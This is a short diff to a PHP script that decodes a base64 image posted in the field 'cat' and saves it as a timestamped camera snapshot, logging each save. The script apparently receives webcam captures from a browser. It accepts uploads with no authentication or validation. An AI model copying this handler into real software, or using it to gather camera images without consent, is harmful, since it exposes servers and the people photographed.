@@ -1,13 +1,11 @@
 <?php
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
 if (!empty($_POST['cat'])) {
-    error_log("Received" . "\r\n", 3, "Log.log");
+    $filteredData = substr($_POST['cat'], strpos($_POST['cat'], ",") + 1);
+    $unencodedData = base64_decode($filteredData);
+    $filename = 'cam_' . $date . '.png';
+    file_put_contents($filename, $unencodedData);
+    error_log("Camera saved: " . $filename . "\r\n", 3, "camera_log.txt");
 }
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam_'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
 exit();
 ?>
